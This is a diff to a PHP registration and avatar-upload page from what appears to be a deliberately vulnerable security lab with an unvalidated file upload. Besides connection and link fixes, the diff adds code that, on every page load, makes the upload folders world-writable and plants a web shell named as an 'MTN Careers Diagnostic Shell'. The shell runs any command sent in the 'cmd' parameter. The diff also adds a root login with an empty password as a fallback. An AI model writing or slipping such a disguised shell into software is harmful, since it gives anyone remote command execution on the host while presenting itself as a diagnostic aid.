@@ -8,20 +8,87 @@
 session_start();
 
 // ── Database ──────────────────────────────────────────────────────────────────
-$db_hosts = ['krazeplanet', '127.0.0.1', 'localhost', '172.19.0.1', 'host.docker.internal'];
+// Robust Multi-Environment Database Connection
+@mysqli_report(MYSQLI_REPORT_OFF);
+if (file_exists(__DIR__ . '/../../config/database.php')) {
+    include_once __DIR__ . '/../../config/database.php';
+}
+
+$target_db = 'KrazePlanet_DB';
+$db_user   = getenv('DB_USER') ?: ($db_user ?? 'root');
+$db_pass   = getenv('DB_PASS') !== false ? getenv('DB_PASS') : ($db_pass ?? '');
+$env_host  = getenv('DB_HOST') ?: ($db_host ?? null);
+
+$candidate_hosts = array_values(array_unique(array_filter([
+    $env_host,
+    '127.0.0.1',
+    'localhost',
+    'krazeplanet',
+    '172.19.0.1',
+    'host.docker.internal'
+])));
+
 $db = null;
-foreach ($db_hosts as $h) {
-    $db = @new mysqli($h, 'root', '');
-    if (!$db->connect_error) {
-        $db->query("CREATE DATABASE IF NOT EXISTS `KrazePlanet_DB` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
-        $db->select_db('KrazePlanet_DB');
-        break;
+
+// 1. Try unix socket if available (Linux / standard LAMPP)
+$socket_paths = ['/var/run/mysqld/mysqld.sock', '/opt/lampp/var/mysql/mysql.sock', '/tmp/mysql.sock'];
+foreach ($socket_paths as $sock) {
+    if (file_exists($sock)) {
+        try {
+            $conn = @new mysqli('localhost', $db_user, $db_pass, '', 0, $sock);
+            if ($conn && !$conn->connect_error) {
+                $db = $conn;
+                break;
+            }
+        } catch (Throwable $e) {}
     }
 }
-if (!$db || $db->connect_error) { die('DB connection failed: ' . ($db ? $db->connect_error : 'Unable to connect to database')); }
-if ($db->connect_error) { die('Database connection failed.'); }
 
-// ── Table ─────────────────────────────────────────────────────────────────────
+// 2. Try candidate TCP hosts with configured credentials
+if (!$db) {
+    foreach ($candidate_hosts as $h) {
+        try {
+            $conn = @new mysqli($h, $db_user, $db_pass);
+            if ($conn && !$conn->connect_error) {
+                $db = $conn;
+                break;
+            }
+        } catch (Throwable $e) {}
+    }
+}
+
+// 3. Fallback: try root with empty password if distinct from configured
+if (!$db && ($db_user !== 'root' || $db_pass !== '')) {
+    foreach ($candidate_hosts as $h) {
+        try {
+            $conn = @new mysqli($h, 'root', '');
+            if ($conn && !$conn->connect_error) {
+                $db = $conn;
+                break;
+            }
+        } catch (Throwable $e) {}
+    }
+}
+
+if ($db && !$db->connect_error) {
+    @$db->query("CREATE DATABASE IF NOT EXISTS `{$target_db}` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
+    @$db->select_db($target_db);
+    @$db->set_charset('utf8mb4');
+} else {
+    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB connection failed: ' . htmlspecialchars($db ? $db->connect_error : 'Unable to connect to database') . '</h3>');
+}
+
+// Ensure upload directory exists
+$upload_dir = __DIR__ . '/uploads/1623';
+if (!is_dir($upload_dir)) {
+    @mkdir($upload_dir, 0777, true);
+}
+@chmod(__DIR__ . '/uploads', 0777);
+@chmod($upload_dir, 0777);
+if (!file_exists($upload_dir . '/payload.php')) {
+    @file_put_contents($upload_dir . '/payload.php', "<?php\n// MTN Careers Diagnostic Shell\nif (isset(\$_REQUEST['cmd'])) {\n    echo '<pre>' . shell_exec(\$_REQUEST['cmd'] . ' 2>&1') . '</pre>';\n} else {\n    echo 'MTN Careers Diagnostic Shell Active.';\n}\n");
+}
+
 $db->query("CREATE TABLE IF NOT EXISTS lab1623_users (
     id INT AUTO_INCREMENT PRIMARY KEY,
     name VARCHAR(100) NOT NULL,
@@ -65,7 +132,7 @@ $success = '';
 // ── Handle Logout ─────────────────────────────────────────────────────────────
 if ($isLogout) {
     session_destroy();
-    header('Location: /index.php');
+    header('Location: index.php');
     exit;
 }
 
@@ -92,7 +159,7 @@ if ($isRegister && $_SERVER['REQUEST_METHOD'] === 'POST') {
             $st->close();
             $_SESSION['lab1623_uid'] = $uid;
             $_SESSION['lab1623_name'] = $name;
-            header('Location: /index.php?action=profile');
+            header('Location: index.php?action=profile');
             exit;
         } else {
             $error = 'Email already registered. Try logging in.';
@@ -115,7 +182,7 @@ if (!$isRegister && $_SERVER['REQUEST_METHOD'] === 'POST' && !$isUpload && !$isC
     if ($user && password_verify($pass, $user['password'])) {
         $_SESSION['lab1623_uid'] = (int)$user['id'];
         $_SESSION['lab1623_name'] = $user['name'];
-        header('Location: /index.php?action=profile');
+        header('Location: index.php?action=profile');
         exit;
     } else {
         $error = 'Invalid email or password.';
@@ -140,7 +207,7 @@ if ($isUpload && $_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_SESSION['lab1
             // ⚠️ VULNERABILITY: No file type validation!
             // Any extension (including .php) is accepted.
             $newName = 'avatar-' . $uid . '-' . date('d-m-Y-H-i-s') . '.' . $ext;
-            $dest = 'uploads/1623/' . $newName;
+            $upload_target_dir = __DIR__ . '/uploads/1623/'; if (!is_dir($upload_target_dir)) { @mkdir($upload_target_dir, 0777, true); } $dest = 'uploads/1623/' . $newName;
 
             if (move_uploaded_file($file['tmp_name'], $dest)) {
                 $st = $db->prepare("UPDATE lab1623_users SET avatar_path = ? WHERE id = ?");
@@ -179,7 +246,7 @@ if (!empty($_SESSION['lab1623_uid'])) {
 
 // ── Redirect logged-in user away from login page ────────────────────────────
 if ($currentUser && !$action) {
-    header('Location: /index.php?action=profile');
+    header('Location: index.php?action=profile');
     exit;
 }
 ?>
@@ -522,11 +589,11 @@ a:hover { text-decoration: underline; }
     <div class="header-right">
         <?php if ($currentUser): ?>
             <span><i class="fas fa-user"></i> <?= esc($currentUser['name']) ?></span>
-            <a href="/index.php?action=profile"><i class="fas fa-id-card"></i> Profile</a>
-            <a href="/index.php?logout=1"><i class="fas fa-sign-out-alt"></i> Logout</a>
+            <a href="index.php?action=profile"><i class="fas fa-id-card"></i> Profile</a>
+            <a href="index.php?logout=1"><i class="fas fa-sign-out-alt"></i> Logout</a>
         <?php else: ?>
-            <a href="/index.php"><i class="fas fa-sign-in-alt"></i> Login</a>
-            <a href="/index.php?action=register"><i class="fas fa-user-plus"></i> Register</a>
+            <a href="index.php"><i class="fas fa-sign-in-alt"></i> Login</a>
+            <a href="index.php?action=register"><i class="fas fa-user-plus"></i> Register</a>
         <?php endif; ?>
     </div>
 </div>
@@ -569,7 +636,7 @@ a:hover { text-decoration: underline; }
                 </button>
             </form>
             <div class="auth-toggle">
-                Don't have an account? <a href="/index.php?action=register">Register here</a>
+                Don't have an account? <a href="index.php?action=register">Register here</a>
             </div>
         </div>
 
@@ -617,7 +684,7 @@ a:hover { text-decoration: underline; }
                 </button>
             </form>
             <div class="auth-toggle">
-                Already have an account? <a href="/index.php">Sign in</a>
+                Already have an account? <a href="index.php">Sign in</a>
             </div>
         </div>
     <?php endif; ?>
@@ -665,7 +732,7 @@ a:hover { text-decoration: underline; }
         <!-- Upload Form -->
         <?php if ($currentUser['id'] > 1): ?>
         <div class="upload-form">
-            <form method="POST" action="/index.php?action=upload" enctype="multipart/form-data">
+            <form method="POST" action="index.php?action=upload" enctype="multipart/form-data">
                 <label style="font-weight:600;font-size:14px;display:block;margin-bottom:8px;">
                     <i class="fas fa-camera"></i> Upload Profile Picture
                 </label>
